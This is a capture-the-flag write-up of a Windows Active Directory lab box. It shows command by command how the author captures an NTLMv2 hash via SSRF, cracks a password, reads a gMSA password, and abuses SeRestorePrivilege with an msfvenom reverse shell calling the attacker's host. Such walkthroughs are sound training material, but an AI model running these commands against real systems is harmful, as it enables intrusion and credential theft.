#Pwned #AD #Windows #SSRF #TokenAbuse #LateralMovement
```IP
192.168.167.165
```
# Enumeration
## Nmap
As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 192.168.167.165 -vvv -p- -oN enum/full
```
The output being:
```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 125 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2024-12-19 08:36:09Z)
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 125
464/tcp   open  kpasswd5?     syn-ack ttl 125
593/tcp   open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 125
3268/tcp  open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 125
3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 
|_http-server-header: Microsoft-HTTPAPI/2.0          
|_http-title: Not Found
8080/tcp  open  http          syn-ack ttl 125 Werkzeug httpd 2.0.1 (Python 3.9.0)
|_http-server-header: Werkzeug/2.0.1 Python/3.9.0
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Super Secure Web Browser       
9389/tcp  open  mc-nmf        syn-ack ttl 125 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC              
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC      
49703/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows  
```
## SMB
I usually scan smb service as soon as I see it in case there are some open shares.
```
nxc smb 192.168.167.165 -u '' -p '' 
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219093954.png?raw=true)

But this does not seem to be the case.
## HTTP 8080
Here we are presented with a web browser that doesn't connect to internet. Let's see if it connects to our machine. 
# Exploitation

We start responder in our local machine:
```
sudo responder -I tun0
```
And then we will try to connect to our machine to see if we can exploit a Server Side Request Forgery (SSRF) attack:
```
http://192.168.167.165:8080/?url=http://192.168.45.246/test
```
Ineed we receive a NTLMv2 hash, which verifies that the target is vulnerable to a SSRF attack:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219094300.png?raw=true)

Let's try to crack it with jhon:
```
john --wordlist=/usr/share/wordlists/rockyou.txt files/enox.hash
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219094313.png?raw=true)

Success! Now we have the following credentials:
```
enox:california
```
## WINRM
We can use our discovered credentials with nxc to assess that we have indeed access to the machine:
```
nxc winrm 192.168.167.165 -u 'enox' -p 'california'
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219094548.png?raw=true)

# PrivEsc

## Lateral Movement
We will use evil-winrm to connect to the target machine and get remote code execution:
```
evil-winrm -i 192.168.167.165 -u enox -p 'california'
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219094828.png?raw=true)

As enox we can navigate to its desktop and retrieve the local flag as shown below:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219094900.png?raw=true)

However we still need to get access as Administrator. In this directory there is too an `application` directory and a `todo.txt` file:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219095142.png?raw=true)
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219095355.png?raw=true)

But they do not seem relevant.
## Automated Tools
### Bloodhound

After some manual enumeration we can run bloodhound:
```bash
bloodhound-python -d heist.offsec -c all -u enox -p 'california' -ns 192.168.167.165 --zip
```
We mark enox user as owned and run `Shortest Paths to Domain Admins from Owned Principals`:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219100927.png?raw=true)

In order to exploit the DCSync vulnerability we are presented with we would have to be a local admin, and we are not. Checking the `Outbound Object Control` of our user we notice an odd Group Delegated Object Control, which can be exploited following the Bloodhound recommendations:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219102257.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219102321.png?raw=true)

It is affecting specifically the user svc_apache. We download an already compiled binary as shown below:
```powershell
iwr -uri https://github.com/expl0itabl3/Toolies/raw/refs/heads/master/GMSAPasswordReader.exe -outfile GMSAPasswordReader.exe
```
And then run the exploit:
```powershell
.\GMSAPasswordReader.exe --accountname svc_apache
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219102530.png?raw=true)

```
C9C9F97308956B4AEDD53C1351F47A84
```

Because svc_apache is a service account we will type a dollar sign at the end of it:
```bash
evil-winrm -i 192.168.167.165 -u svc_apache$ -H C9C9F97308956B4AEDD53C1351F47A84
```
And now we have access again as svc_apache. It contains a ps1 script in its Documents folder which seems to add the `SeRestorePrivilege`.

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219103918.png?raw=true)

And if we check it with `whoami /priv` it is enabled indeed:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219103952.png?raw=true)

There is an already precompiled exploit for this token which we can download with the following command:
```powershell
iwr -uri https://github.com/dxnboy/redteam/raw/refs/heads/master/SeRestoreAbuse.exe -outfile SeRestoreAbuse.exe
```

This exploit executes another file with higher permissions, so we will create a reverse shell file with msfvenom:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.246 LPORT=4444 -f exe > rev.exe
```
And download it to the target machine aswell:
```powershell
iwr -uri http://192.168.45.246:8000/rev.exe -outfile shell.exe
```
And perform the complete exploit as shown below:
```powershell
.\SeRestoreAbuse.exe C:\Users\svc_apache$\Documents\shell.exe
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219105244.png?raw=true)

And upon execution we get NT Authority\System access, and therefore we can retrieve the proof.txt flag!

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241219105350.png?raw=true)

Pwned!
